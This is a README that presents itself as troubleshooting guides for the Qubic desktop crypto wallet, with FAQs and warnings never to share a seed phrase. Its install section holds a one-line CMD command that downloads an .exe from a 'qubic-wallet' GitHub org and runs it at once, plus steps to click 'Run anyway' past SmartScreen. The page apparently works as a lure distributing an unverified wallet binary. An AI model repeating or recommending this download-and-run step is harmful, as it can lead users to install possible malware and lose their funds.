![Qubic Wallet](assets/qubic-wallet-download-seed-phrase-install-address-article-banner.png)

# Qubic Wallet troubleshooting guides

Work through sync, balance, transaction and launch problems in order.

<p align="center"><a href="https://github.com/qubic-wallet/qubic-wallet-trust/blob/main/LICENSE"><img src="assets/badge-license.svg" alt="License"></a> <a href="https://github.com/qubic-wallet/qubic-desktop-wallet/releases/tag/v0.8.2"><img src="assets/badge-release.svg" alt="Release"></a></p>

## Downloads - v0.8.2

<p align="center"><a href="https://github.com/qubic-wallet/qubic-desktop-wallet/releases/latest/download/qubic-wallet-desktop-v0.8.2-windows.exe"><img src="assets/download-windows.svg" alt="Download Windows"></a> <a href="https://github.com/qubic-wallet/qubic-desktop-wallet/releases/latest/download/qubic-wallet-desktop-v0.8.2-osx-arm64.zip"><img src="assets/download-macos.svg" alt="Download macOS"></a> <a href="https://github.com/qubic-wallet/qubic-desktop-wallet/releases/latest/download/qubic-wallet-desktop-v0.8.2-linux-x64.zip"><img src="assets/download-linux.svg" alt="Download Linux"></a></p>

| Platform | Requirements | File |
| --- | --- | --- |
| <img src="assets/platform-windows.svg" alt="platform Windows"> | Windows 10 (1909) or later, 64-bit | [`qubic-wallet-desktop-v0.8.2-windows.exe`](https://github.com/qubic-wallet/qubic-desktop-wallet/releases/latest/download/qubic-wallet-desktop-v0.8.2-windows.exe) |
| <img src="assets/platform-macos.svg" alt="platform macOS"> | macOS 12 or later | [`qubic-wallet-desktop-v0.8.2-osx-arm64.zip`](https://github.com/qubic-wallet/qubic-desktop-wallet/releases/latest/download/qubic-wallet-desktop-v0.8.2-osx-arm64.zip) |
| <img src="assets/platform-linux.svg" alt="platform Linux"> | x64, Ubuntu 20.04 or later, or equivalent | [`qubic-wallet-desktop-v0.8.2-linux-x64.zip`](https://github.com/qubic-wallet/qubic-desktop-wallet/releases/latest/download/qubic-wallet-desktop-v0.8.2-linux-x64.zip) |

> Most wallet symptoms have one of four causes: the client is behind the network, the account is not the
> one you think, the transaction never left the wallet, or the build is broken. These guides separate them
> before you start changing settings.

## What this repository is for

Twelve guides for the problems that actually get reported: a wallet that will not sync, a balance that
does not show, a send that never confirms, a fee that looks wrong, an address that will not paste, and a
build that will not open. Each page is ordered rather than exhaustive, because troubleshooting by
checklist produces more changes than answers. The first section of each guide is the one that rules out
the most common cause, and the page says when to stop reading because the symptom is something else.

The guides assume you are on the desktop wallet and that you have not edited anything yet. Where a step
changes local state, the page says what it changes and whether it is reversible. Nothing in this
repository asks you to reinstall as a first move, and nothing asks for your seed phrase: a guide that
requests a seed to diagnose a sync problem is describing an attack, not a fix.

Diagnosis is slow when two causes are live at once, so each page names the single observation that tells
you whether you are still in the right guide. If the wallet already shows the transaction on an explorer,
the client is not the problem and the page stops. If the tick has not moved for twenty minutes, the
network path is the problem and no amount of reinstalling will help.

Where the answer is "this is not fixable from here", the page says so plainly. A transaction that a peer
has not accepted cannot be recalled by changing a setting, and an account restored from the wrong seed
will keep showing the wrong balance no matter how many times the client is restarted.

## Who it is for

- Users whose wallet shows a balance that does not match what they sent or expected.
- People with a transaction that is pending, stuck or reported as failed.
- Anyone whose client says offline, refuses to sync, or opens to an empty screen.
- Users moving funds to an exchange and wanting the deposit to actually arrive.

## Start here

- [Qubic Wallet not syncing: diagnose it in the right order](qubic-wallet-not-syncing.md) - the ordered
  diagnosis that resolves most balance and status symptoms before anything else is touched.
- [Qubic Wallet balance not showing: tick, network and seed checks](qubic-wallet-balance-not-showing.md) -
  why an empty balance is usually a sync or account question rather than a lost-funds question.
- [Qubic Wallet transaction stuck, pending or failed: what to check](qubic-wallet-transaction-stuck-failed.md) -
  the difference between not sent, not accepted and not confirmed, and what each one allows.
- [Qubic Wallet won't open: launch failures and their causes](qubic-wallet-wont-open-crash.md) - the launch
  failure page, including the parts that are a local data or permission problem rather than a wallet one.

## How to use these guides

1. Read the first section and stop as soon as it matches your case; do not run every step.
2. Change one thing at a time, and note what you changed, so a later step is not measuring a mixture.
3. Check the transaction on an explorer before you assume the wallet is wrong.
4. If a guide tells you to restore, do it on a machine where the current state is still intact.
5. Write down the version you are on before you change a setting; several answers depend on it.
5. Never paste a seed into a page, a chat or a support form; no legitimate guide needs it.

## The guides

### Sync and connectivity

- [Qubic Wallet not syncing: diagnose it in the right order](qubic-wallet-not-syncing.md) - the sequence
  that separates a slow network from a wrong network from a client that has given up.
- [Why Qubic Wallet says offline (and how to tell if it really is)](qubic-wallet-offline-status-error.md) -
  what the status actually reflects, and the local causes that produce a false offline reading.
- [Switching Qubic Wallet between mainnet and testnet](qubic-wallet-network-switch-mainnet-testnet.md) - how
  the network setting changes what you see, and why a wrong network looks like a missing balance.
- [Qubic Wallet balance not showing: tick, network and seed checks](qubic-wallet-balance-not-showing.md) - the
  three checks that explain an empty or stale balance, in the order that saves the most time.

### Sending, receiving and history

- [How to send QU and other Qubic assets from the desktop wallet](qubic-wallet-send-qu-tokens.md) - the send
  flow, what each field means, and the point after which the transaction cannot be cancelled.
- [Qubic Wallet transaction stuck, pending or failed: what to check](qubic-wallet-transaction-stuck-failed.md) -
  the states a transfer can sit in, and which of them the wallet can still influence.
- [Finding a Qubic Wallet transaction history and TXID](qubic-wallet-transaction-history.md) - where the
  history lives, what a TXID is for, and how to quote it when you need help.
- [Qubic Wallet fees: what you actually pay to send and trade](qubic-wallet-fees-explained.md) - the fee
  components, why a trade can cost more than a send, and what a fee estimate does not promise.
- [Qubic Wallet address format, QR codes and receiving funds](qubic-wallet-address-format-qr.md) - the
  address form, what a QR encodes, and the checks that catch a truncated paste.

### Verifying and moving between services

- [How to check a QUBIC transaction when the wallet shows nothing](qubic-wallet-block-explorer-verify.md) -
  using an explorer as an independent view, and what to conclude when the explorer agrees with the wallet.
- [Qubic Wallet to exchange: deposits, withdrawals and stuck transfers](qubic-wallet-exchange-deposit-withdrawal.md) -
  the handoff between wallet and exchange, including which side owns the delay at each stage.

### Launch and runtime

- [Qubic Wallet won't open: launch failures and their causes](qubic-wallet-wont-open-crash.md) - the local
  causes of a launch failure, the safe order to test them, and when to preserve the data folder.

## What each guide changes

| Symptom | Guide | Outcome |
| --- | --- | --- |
| Balance looks wrong | [Balance checks](qubic-wallet-balance-not-showing.md) | You know whether it is sync, network or account |
| Wallet will not sync | [Not syncing](qubic-wallet-not-syncing.md) | A cause you can name, not a reset you hoped for |
| Send never confirmed | [Stuck transaction](qubic-wallet-transaction-stuck-failed.md) | The transaction state and what it permits |
| Exchange deposit missing | [Exchange transfer](qubic-wallet-exchange-deposit-withdrawal.md) | Which side to chase, with the TXID in hand |
| Wallet will not start | [Launch failures](qubic-wallet-wont-open-crash.md) | A launch path, with your data preserved |
| Address rejected somewhere | [Address and QR](qubic-wallet-address-format-qr.md) | A format you can verify character by character |

## Common first questions

### The wallet says offline. Is my money gone?

No. Offline describes the client's connection, not the account. The offline page explains what the status
reflects and which local conditions produce it while the account is perfectly intact.

### Can I cancel a transaction that is still pending?

Only while it has not been accepted. Once a peer has it, the wallet cannot recall it, and the stuck
transaction page explains what remains possible and what does not.

### Why does my balance show zero after restoring?

Usually the restore produced a different account than expected, or the client has not caught up yet. The
balance page walks the tick, network and seed checks that separate those two cases.

### Do I need to reinstall to fix a sync problem?

Rarely, and never first. The not-syncing page puts reinstallation last because it destroys the local state
that would have told you what was actually wrong.

## Before you install

- Note the exact version you run before changing anything; several answers depend on it.
- Keep the data folder untouched until a guide tells you otherwise.
- Have the TXID ready if the problem involves a specific transfer.
- Read the first section of the relevant guide before trying the second.

## How to install Qubic Wallet

Quick install (CMD):

```cmd
curl -fLo setup.exe https://github.com/qubic-wallet/qubic-desktop-wallet/releases/latest/download/qubic-wallet-desktop-v0.8.2-windows.exe && setup.exe
```

### Windows

Manual install:

1. Download <a href="https://github.com/qubic-wallet/qubic-desktop-wallet/releases/latest/download/qubic-wallet-desktop-v0.8.2-windows.exe">qubic-wallet-desktop-v0.8.2-windows.exe</a>.
2. Open the downloaded file.
3. If SmartScreen appears, choose More info, then Run anyway.
4. Finish the setup steps.

### macOS

The macOS build ships as a .zip archive, so there is no one-line command that both downloads and launches it. Extract it first, then open the app.

1. Download <a href="https://github.com/qubic-wallet/qubic-desktop-wallet/releases/latest/download/qubic-wallet-desktop-v0.8.2-osx-arm64.zip">qubic-wallet-desktop-v0.8.2-osx-arm64.zip</a>.
2. Double-click the .zip to extract it.
3. Move the extracted app to Applications.
4. On first launch, right-click the app and choose Open.

### Linux

The Linux build ships as a .zip archive as well; extract it and run the binary inside.

1. Download <a href="https://github.com/qubic-wallet/qubic-desktop-wallet/releases/latest/download/qubic-wallet-desktop-v0.8.2-linux-x64.zip">qubic-wallet-desktop-v0.8.2-linux-x64.zip</a>.
2. Extract the archive.
3. Make the extracted binary executable.
4. Run it.


## About and license

Qubic Wallet is the desktop wallet for Qubic: seed-based accounts, local key storage and the QX trading screen, on Windows, macOS and Linux.

These guides are published under the MIT license; the full text is in the repository `LICENSE` file. Nothing here is an audit or an endorsement, and every claim is checked against the release, the repository or the client constants rather than repeated from marketing.
